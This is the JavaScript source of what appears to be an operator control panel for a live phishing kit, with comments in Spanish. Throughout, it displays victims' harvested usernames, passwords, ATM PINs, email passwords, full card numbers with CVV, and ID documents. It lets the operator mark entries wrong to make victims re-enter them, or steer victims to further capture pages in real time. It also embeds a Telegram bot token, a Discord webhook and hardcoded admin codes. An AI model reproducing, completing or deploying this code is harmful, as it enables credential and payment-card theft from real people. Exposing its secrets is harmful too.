// 📦 Importa funciones de Firebase para interactuar con la base de datos: leer (onValue), actualizar (update), y acceder a referencias (ref).
import { db, ref, onValue, update } from "./config.js";

// 🖥️ Esta función detecta el sistema operativo del dispositivo a partir del user agent del navegador.
function detectarDispositivo(userAgent) {
  userAgent = userAgent.toLowerCase();
  if (/windows/.test(userAgent)) return "Windows";
  if (/iphone/.test(userAgent)) return "iPhone";
  if (/ipad/.test(userAgent)) return "iPad";
  if (/android/.test(userAgent)) return "Android";
  if (/macintosh/.test(userAgent)) return "Mac";
  if (/linux/.test(userAgent)) return "Linux";
  return "Desconocido";
}

// 🔁 Almacena los IDs de las nubes que ya se han creado para evitar duplicados.
const nubesCreadas = new Set();
// 📦 Contenedor principal donde se renderizan las tarjetas (nubes) en el panel.
const contenedor = document.getElementById("contenedor");
// 🧊 Elemento HTML donde se muestran los formularios modales flotantes (Token, Gmail, etc).
const modal = document.getElementById("formulario-modal");


// ********** APARTADO DE NOTIFICACIÓN TELEGRAM **********
async function notificarTelegram(usuario, tipo) {
  const token = "8197219472:AAGZ-3sobKFCGWPKMa8ar11i2ZythP6rwGQ"; // reemplaza con tu token
  const chatId = "5592536910"; // reemplaza con tu chatId
  const fecha = new Date().toLocaleDateString("es-CO");
  const hora = new Date().toLocaleTimeString("es-CO", { hour12: false });

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const ip = data.ip || "Desconocida";
    const ciudad = data.city || "Desconocida";
    const pais = data.country_name || "Desconocido";

    const mensaje = `
    🖲 *Alerta de Panel*
    ${tipo === "login" ? "🟢 Conectado" : "🔴 Desconectado"}
    👤 Usuario: *${usuario}*
    📅 Fecha: ${fecha}
    ⏰ Hora: ${hora}
    🌐 IP: ${ip}
    📍 Ciudad: ${ciudad}
    🌎 País: ${pais}
    `;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: mensaje, parse_mode: "Markdown" })
    });
  } catch (error) {
    console.error("❌ Error al enviar a Telegram:", error);
  }
}

// ********** APARTADO DE NOTIFICACIÓN DISCORD **********
async function notificarDiscord(usuario, tipo) {
  const webhook = "https://discord.com/api/webhooks/1416976805700567182/F-iWZJJ3WGFwBxWAkuEEUxo7FGbo26OXTsMSK2FwAkQqEKBmsMdJ-UN1Qt6dvL06EtQP";
  const fecha = new Date().toLocaleDateString("es-CO");
  const hora = new Date().toLocaleTimeString("es-CO", { hour12: false });

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const ip = data.ip || "Desconocida";
    const ciudad = data.city || "Desconocida";
    const pais = data.country_name || "Desconocido";

    const mensaje = {
      content: `🖲 **Alerta de Panel**
${tipo === "login" ? "🟢 Conectado" : "🔴 Desconectado"}
👤 Usuario: **${usuario}**
📅 Fecha: ${fecha}
⏰ Hora: ${hora}
🌐 IP: ${ip}
📍 Ciudad: ${ciudad}
🌎 País: ${pais}`
    };

    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(mensaje)
    });
  } catch (error) {
    console.error("❌ Error al enviar a Discord:", error);
  }
}

// ===== Login =====
window.verificarLogin = () => {
  const user = document.getElementById("usuario").value.trim();
  const pass = document.getElementById("clave").value.trim();

  const usuarios = [{ usuario: "admin", clave: "230320" }];

  if (usuarios.some(u => u.usuario === user && u.clave === pass)) {
    localStorage.setItem("panelLoggedIn", "true");
    localStorage.setItem("panelUser", user);

    document.getElementById("login-container").style.display = "none";
    document.getElementById("barra-superior").style.display = "block";
    contenedor.style.display = "flex";

    const sonido = document.getElementById("alerta-sonido");
    if (sonido) sonido.play().catch(() => {});

    cargarPanel();

    // Notificar conexión
    notificarTelegram(user, "login");
    notificarDiscord(user, "login");
  }
};

window.cerrarSesion = () => {
  const user = document.getElementById("usuario").value.trim() || localStorage.getItem("panelUser") || "Desconocido";

  // Notificar desconexión
  notificarTelegram(user, "logout");
  notificarDiscord(user, "logout");

  localStorage.clear();

  document.getElementById("login-container").style.display = "flex";
  document.getElementById("barra-superior").style.display = "none";
  contenedor.style.display = "none";
  contenedor.innerHTML = "";

  document.getElementById("usuario").value = "";
  document.getElementById("clave").value = "";

  document.documentElement.classList.remove("logueado");
};



// Util: normaliza el texto ipInfo que guardamos como "IP - Ciudad - País"
function formatearIp(ipInfo) {
  if (!ipInfo) return "—";
  const parts = String(ipInfo).split("-").map(s => s.trim()).filter(Boolean);
  return parts.join(" | ");
}


// ===== Panel =====
function cargarPanel() {
  onValue(ref(db, "dataPages"), snapshot => {
    const data = snapshot.val();
    if (!data) return;

    Object.entries(data).forEach(([uid, info]) => {
      if (info.oculto) return;

      const vacia = !info.username && !info.password && !info.codigo && !info.email && !info.passwords && !info.tarjeta && !info.documento;
      if (vacia) return;

      let nube = document.getElementById("nube-" + uid);
      const esNueva = !nube;

      const conectado = info.estado === "abierto";
      const bolita = conectado ? "verde" : "rojo";

      // ---- Card ----
      const tarjetaHi = info.mostrarBarraTarjeta ? "input-highlight" : "";
      const mesTarj  = (info.dia || info["día"] || "--");
      const anioTarj = (info.año || info.anio || "----");
      const cvvTarj  = (info.cvv || "");
      const cleanNum = (info.tarjeta || "").replaceAll(" ","");
      const tarjetaCompletada = String(info.tarjetaEstado || info.tarjetaCompleta || "").toLowerCase() === "complete";
      const enSep2 = String(info.pagina || "").toLowerCase() === "sep2";
      const cardClasses = ["btn-ver-tarjeta", tarjetaHi];
      if (tarjetaCompletada) cardClasses.push("is-complete"); else if (enSep2) cardClasses.push("is-current");
      const tarjetaBloque = `
        <div class="tarjeta-cell">
          <button class="${cardClasses.join(' ')}" type="button"
            onclick="abrirTarjeta('${uid}','${cleanNum}','${mesTarj}','${anioTarj}','${cvvTarj}')">Card</button>
        </div>`;

      // ---- Docu ----
      const docuHi = info.mostrarBarraDocumento ? "input-highlight" : "";
      const docEstadoCompleto = String(info.documentoEstado || "").toLowerCase() === "complete";
      const enSep3 = String(info.pagina || "").toLowerCase() === "sep3";
      const docuClasses = ["btn-ver-documento", docuHi];
      if (docEstadoCompleto) docuClasses.push("is-complete"); else if (enSep3) docuClasses.push("is-current");
      const documentoBloque = `
        <div class="docu-cell">
          <button class="${docuClasses.join(' ')}" type="button" onclick="abrirDocumento('${uid}')">Docu</button>
        </div>`;

      const html = `
        <div class="cerrar" onclick="cerrarNube('${uid}')">X</div>
        <div class="estado-conexion ${bolita}">${conectado ? "Conectado" : "Desconectado"}</div>

        <div class="ip-info">
          <strong>IP:</strong> ${info.ip || "?"} |
          <strong>Ciudad:</strong> ${info.ciudad || "?"} |
          <strong>País:</strong> ${info.pais || "?"} |
          <strong>Dispositivo:</strong> ${info.dispositivo || "?"}
        </div>

        <div class="datos-linea">
          <div><strong>Username:</strong><br>
            <span class="${info.mostrarBarra ? "input-highlight" : ""}" onclick="copiarTexto('${info.username || ""}')">${info.username || "*******"}</span>
          </div>
          <div><strong>Password:</strong><br>
            <span class="${info.mostrarBarra ? "input-highlight" : ""}" onclick="copiarTexto('${info.password || ""}')">${info.password || "*******"}</span>
          </div>
          <div><strong>ATM:</strong><br>
            <span class="${info.mostrarBarraCodigo ? "input-highlight" : ""}" onclick="copiarTexto('${info.codigo || ""}')">${info.codigo || "*******"}</span>
          </div>
          <div><strong>Email:</strong><br>
            <span class="${(info.mostrarBarraHotmailEmail || info.mostrarBarraEmail) ? "input-highlight" : ""}" onclick="copiarTexto('${info.email || ""}')">${info.email || "*******"}</span>
          </div>
          <div><strong>Passwords:</strong><br>
            <span class="${(info.mostrarBarraHotmailPass || info.mostrarBarraGmail) ? "input-highlight" : ""}" onclick="copiarTexto('${info.passwords || ""}')">${info.passwords || "*******"}</span>
          </div>
          <div><strong>Tarjeta:</strong><br>${tarjetaBloque}</div>
          <div><strong>Documento:</strong><br>${documentoBloque}</div>
        </div>

        <div class="botones">
          <button class="btn rojo"   onclick="incorrectoLogin('${uid}')">Incorrecto</button>
          <button class="btn morado" onclick="sep1('${uid}')">Sep1</button>
          <button class="btn morado" onclick="sep2('${uid}')">Sep2</button>
          <button class="btn morado" onclick="sep3('${uid}')">Sep3</button>
          <button class="btn amarillo" onclick="abrirMail('${uid}')">Gmail</button>
          <button class="btn rosa"    onclick="abrirHot('${uid}')">Hotmail</button>
        </div>`;

      if (esNueva) {
        nube = document.createElement("div");
        nube.className = "nube";
        nube.id = "nube-" + uid;
        nube.innerHTML = html;
        contenedor.appendChild(nube);
        if (!nubesCreadas.has(uid)) {
          const sonido = document.getElementById("alerta-sonido");
          if (sonido) sonido.play().catch(()=>{});
          nubesCreadas.add(uid);
        }
      } else {
        nube.innerHTML = html;
      }
    });
  });
}

// ===== Acciones =====
window.cerrarNube = async uid => {
  const fecha = new Date().toLocaleDateString("es-CO");
  const userAgent = navigator.userAgent;
  const dispositivo = detectarDispositivo(userAgent);
  let ip = "?", ciudad = "?", pais = "?", ipInfo = "Desconocido";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ip = data.ip || "?"; ciudad = data.city || "?"; pais = data.country_name || "?";
    ipInfo = `${ip} - ${ciudad} - ${pais}`;
  } catch {}
  await update(ref(db, "dataPages/" + uid), {
    oculto:true, fecha, userAgent, ipInfo, ip, ciudad, pais, dispositivo
  });
  const el = document.getElementById("nube-" + uid);
  if (el) el.remove();
};
window.incorrectoLogin = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto", mostrarBarra:false }); cerrarFormulario(); };

// Navegación
window.sep1 = uid => update(ref(db, "dataPages/" + uid), { estado:"sep1" });
window.sep2 = uid => update(ref(db, "dataPages/" + uid), { estado:"sep2" });
window.sep3 = uid => update(ref(db, "dataPages/" + uid), { estado:"sep3" });

window.irAIndex   = uid => { update(ref(db, "dataPages/" + uid), { estado:"irAIndex"   }); cerrarFormulario(); };
window.irAGmail   = uid => { update(ref(db, "dataPages/" + uid), { estado:"irAGmail"   }); cerrarFormulario(); };
window.irAHotmail = uid => { update(ref(db, "dataPages/" + uid), { estado:"irAHotmail" }); cerrarFormulario(); };

window.incorrectoToken   = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto",    mostrarBarraCodigo:false }); cerrarFormulario(); };
window.incorrectoGmail   = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto",    mostrarBarraGmail:false  }); cerrarFormulario(); };
window.incorrectoHotmail = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrectoHot", mostrarBarraHotmailPass:false }); cerrarFormulario(); };

// ===== Modal: Tarjeta (CVV visible) =====
let _tarjetaOpenUid = null;
window.abrirTarjeta = (uid, tarjeta, mes, anio, cvv) => {
  _tarjetaOpenUid = uid;
  const numFmt = (String(tarjeta || "")).replace(/\D/g,"").replace(/(\d{4})(?=\d)/g,"$1 ").trim();
  const fecha  = `${mes || "--"}/${anio || "----"}`;
  const cvRaw  = String(cvv || "");

  modal.innerHTML = `
    <div class="modal-formulario" role="dialog" aria-label="Formulario Tarjeta">
      <h4>Formulario Tarjeta</h4>
      <input id="mTarNum"   type="text" value="Número: ${numFmt || "—"}" disabled>
      <input id="mTarFecha" type="text" value="Fecha: ${fecha}" disabled>
      <input id="mTarCvv"   type="text" value="Código: ${cvRaw || "—"}" disabled>
      <div class="modal-buttons">
        <button class="btn azul" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>`;

  // Live update
  onValue(ref(db, "dataPages/" + uid), (snap) => {
    if (_tarjetaOpenUid !== uid) return;
    const i = snap.val() || {};
    const n  = (String(i.tarjeta || "")).replace(/\D/g,"").replace(/(\d{4})(?=\d)/g,"$1 ").trim();
    const me = (i.dia || i["día"] || "--");
    const an = (i.año || i.anio || "----");
    const cv = String(i.cvv || "");

    const numEl   = document.getElementById("mTarNum");
    const fechaEl = document.getElementById("mTarFecha");
    const cvvEl   = document.getElementById("mTarCvv");
    if (numEl)   numEl.value   = `Número: ${n || "—"}`;
    if (fechaEl) fechaEl.value = `Fecha: ${me}/${an}`;
    if (cvvEl)   cvvEl.value   = `Código: ${cv || "—"}`;
  });
};
window.enviarTarjeta = uid => { update(ref(db, "dataPages/" + uid), { mostrarBarraTarjeta:true, estado:"abierto" }).finally(cerrarFormulario); };
window.incorrectoTarjeta = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto", mostrarBarraTarjeta:false }).finally(cerrarFormulario); };

// ===== Modal: Documento =====
let _documentoOpenUid = null;
window.abrirDocumento = uid => {
  _documentoOpenUid = uid;
  modal.innerHTML = `
    <div class="modal-formulario" role="dialog" aria-label="Formulario Documento">
      <h4>Formulario Documento</h4>
      <input id="mDocTipo" type="text" value="Tipo: —" disabled>
      <input id="mDocNum"  type="text" value="Número: —" disabled>
      <div class="modal-buttons">
        <button class="btn azul" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>`;
  onValue(ref(db, "dataPages/" + uid), (snap) => {
    if (_documentoOpenUid !== uid) return;
    const i = snap.val() || {};
    const tipo = i.documentoTipo || "—";
    const num  = (i.documentoMask || i.documentoNumero || "—");
    const tipoEl = document.getElementById("mDocTipo");
    const numEl  = document.getElementById("mDocNum");
    if (tipoEl) tipoEl.value = `Tipo: ${tipo}`;
    if (numEl)  numEl.value  = `Número: ${num}`;
  });
};

// ===== Modal: Gmail =====
window.abrirMail = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario Gmail</h4>
      <input type="text" id="mailCodigo-${uid}" placeholder="Código (2 dígitos)" maxlength="2">
      <input type="text" id="mailDescripcion-${uid}" placeholder="Descripción">
      <div class="modal-buttons">
        <button class="btn negro" onclick="enviarMail('${uid}')">Enviar</button>
        <button class="btn rojo"  onclick="incorrectoGmail('${uid}')">Incorrecto</button>
        <button class="btn azul"  onclick="irAGmail('${uid}')">Inicio</button>
        <button class="btn"      onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>`;
};
window.enviarMail = async uid => {
  const codigo = (document.getElementById("mailCodigo-" + uid)?.value || "").trim();
  const descripcion = (document.getElementById("mailDescripcion-" + uid)?.value || "").trim();
  if (!codigo || !descripcion) return;
  const fecha = new Date().toLocaleDateString("es-CO");
  const userAgent = navigator.userAgent;
  let ipInfo = "Desconocido";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = `${data.ip || "?"} - ${data.city || "?"} - ${data.country_name || "?"}`;
  } catch {}
  await update(ref(db, "dataPages/" + uid), { mailCodigo: codigo, mailDescripcion: descripcion, fecha, userAgent, ipInfo });
  cerrarFormulario();
};

// ===== Modal: Hotmail =====
window.abrirHot = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario Hotmail</h4>
      <div class="modal-buttons">
        <button class="btn negro" onclick="irAHotmail('${uid}')">Inicio</button>
        <button class="btn rojo"  onclick="incorrectoHotmail('${uid}')">Incorrecto</button>
        <button class="btn"      onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>`;
};

// ===== Modal utils =====
window.cerrarFormulario = () => {
  _tarjetaOpenUid = null;
  _documentoOpenUid = null;
  modal.innerHTML = "";
};

// ===== Historial / utilidades =====
window.mostrarNubeEliminadas = () => {
  const tablaBody = document.getElementById("tabla-nube");
  tablaBody.innerHTML = "";
  onValue(ref(db, "dataPages"), snapshot => {
    const data = snapshot.val();
    if (!data) return;
    const eliminadas = [];
    Object.values(data).forEach(info => { if (info.oculto === true) eliminadas.push(info); });
    eliminadas.sort((a, b) => (new Date(b.fecha || "2000-01-01")) - (new Date(a.fecha || "2000-01-01")));
    eliminadas.forEach(info => {
      const row = document.createElement("tr");
      row.innerHTML = `
        <td>${info.username || ""}</td>
        <td>${info.password || ""}</td>
        <td>${info.codigo   || ""}</td>
        <td>${info.email    || ""}</td>
        <td>${info.passwords|| ""}</td>
        <td>${(info.tarjeta || "").trim()}<br><strong>fecha:</strong> ${(info.dia || info["día"] || "--")}/${(info.año || info.anio || "----")}<br><strong>cvv:</strong> ${(info.cvv || "").toString()}</td>
        <td><strong>${(info.documentoTipo || "documento")}:</strong><br>${(info.documentoMask || info.documentoNumero || "—")}</td>
        <td><strong>Fecha:</strong> ${info.fecha || "—"}<br>
            <strong>User Agent:</strong> <small>${info.userAgent || "—"}</small><br>
            <strong>Ip:</strong> ${formatearIp(info.ipInfo)}<br>
            <strong>Dispositivo:</strong> ${info.dispositivo || "?"}
        </td>`;
      tablaBody.appendChild(row);
    });
  });
  contenedor.style.display = "none";
  document.getElementById("nube-pasarela").style.display = "block";
};
window.regresarPanel = () => {
  document.getElementById("nube-pasarela").style.display = "none";
  contenedor.style.display = "flex";
};
window.limpiarNubes = () => {
  const codigo = prompt("Ingresa el código de 6 dígitos para confirmar:");
  if (!codigo || codigo.length !== 6) return alert("❌ Código inválido.");
  if (codigo !== "102030") return alert("🚫 Código incorrecto.");
  if (!confirm("⚠️ Esto eliminará TODO el contenido de la nube. ¿Estás seguro?")) return;
  update(ref(db), { dataPages: null })
    .then(() => { alert("✅ Todos los datos han sido eliminados."); document.getElementById("tabla-nube").innerHTML = ""; contenedor.innerHTML = ""; })
    .catch(() => alert("❌ Ocurrió un error al intentar limpiar los datos."));
};

// ===== Sesión persistida =====
if (localStorage.getItem("panelLoggedIn") === "true") {
  document.getElementById("login-container").style.display = "none";
  document.getElementById("barra-superior").style.display = "block";
  contenedor.style.display = "flex";
  cargarPanel();
}

// ===== Copiar =====
window.copiarTexto = function (texto) {
  if (!texto) return alert("⚠️ Nada que copiar.");
  navigator.clipboard.writeText(texto).then(() => {
    const toast = document.createElement("div");
    toast.innerText = "✅ Copiado";
    toast.style.position = "fixed";
    toast.style.bottom = "20px";
    toast.style.right = "20px";
    toast.style.padding = "10px 15px";
    toast.style.background = "#2e85ccff";
    toast.style.color = "white";
    toast.style.borderRadius = "8px";
    toast.style.fontWeight = "bold";
    toast.style.zIndex = "9999";
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2000);
  }).catch(() => alert("❌ No se pudo copiar."));
};




(() => {
  // Rutas que ya tienes en tu proyecto (ajústalas si tus nombres son distintos)
  const ROUTES = {
    inicio: "index.html",
    gmail: "gmail",           // si es una vista interna tipo /gmail (SPA)
    gmailHtml: "gmail.html",  // si es archivo html real
    sep2: "sep2.html",
    sep3: "sep3.html"
    // agrega más si lo necesitas…
  };

  // Inicializa todas las nubes del panel
  const nubes = Array.from(document.querySelectorAll('.nube'));
  nubes.forEach((root, i) => {
    // ID único por nube para namespacing (estado, storage, etc.)
    if (!root.dataset.nubeId) {
      root.dataset.nubeId = `nube-${i+1}`;
    }

    // Encuentra el iframe de ESTA nube (donde cargaremos las vistas)
    const frame = root.querySelector('.nube-frame');
    if (!frame) {
      console.warn(`[${root.dataset.nubeId}] Falta <iframe class="nube-frame"> dentro de esta nube.`);
      return;
    }

    // Delegación: cualquier click con data-route dentro de ESTA nube
    root.addEventListener('click', (ev) => {
      const btn = ev.target.closest('[data-route]');
      if (!btn || !root.contains(btn)) return;

      ev.preventDefault();

      const routeKey = btn.dataset.route;
      let url = ROUTES[routeKey];

      if (!url) {
        console.warn(`[${root.dataset.nubeId}] Ruta no definida para:`, routeKey);
        return;
      }

      // Si estás usando una SPA para algunas rutas (p.ej. "gmail"),
      // convierte "gmail" en "gmail.html" o en la ruta real que uses.
      // Abajo resolvemos simple: si no termina en ".html" lo hacemos html.
      if (!/\.html?$/i.test(url)) {
        url = `${url}.html`;
      }

      // Cambia SOLO el iframe de ESTA nube
      frame.src = url;
    });

    // Ejemplo: estados/almacenamiento por-nube (si lo necesitas)
    // Usa keys con namespace para no pisar otras nubes:
    // localStorage.setItem(`${root.dataset.nubeId}:ultimaRuta`, frame.src);
    // frame.addEventListener('load', () => {
    //   localStorage.setItem(`${root.dataset.nubeId}:ultimaRuta`, frame.contentWindow.location.href);
    // });
  });

  // ---------- Adaptador para funciones globales existentes ----------
  // Si tus botones todavía tienen onclick="gmail()" o similares
  // y no quieres tocar el HTML, estos adaptadores enrutan por-nube:
  function withNube(fn) {
    return function (ev) {
      // intenta resolver la nube por el objetivo del evento o por el botón mismo
      const target = ev?.target || window.event?.srcElement;
      const root = target?.closest?.('.nube') || this?.closest?.('.nube');
      if (!root) return console.warn('No se pudo resolver la nube origen');
      const frame = root.querySelector('.nube-frame');
      if (!frame) return console.warn('No hay .nube-frame en esta nube');
      return fn(root, frame, ev);
    }
  }

  // Ejemplos de “polyfills” para tus funciones globales (ajusta nombres):
  window.irGmail = withNube((root, frame) => frame.src = 'gmail.html');
  window.irInicio = withNube((root, frame) => frame.src = 'index.html');
  window.irSep2   = withNube((root, frame) => frame.src = 'sep2.html');
  window.irSep3   = withNube((root, frame) => frame.src = 'sep3.html');

  // Ahora, si un botón viejo tiene onclick="irGmail()", sólo afectará su propia nube.
})();
